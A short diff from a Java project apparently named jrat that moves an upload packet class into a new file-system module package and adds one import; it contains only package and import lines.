@@ -1,6 +1,7 @@
-package jrat.client.packets.outgoing;
+package jrat.module.fs.packets.upload;
 
 import jrat.client.Connection;
+import jrat.client.packets.outgoing.OutgoingPacket;
 
 import java.io.File;
 
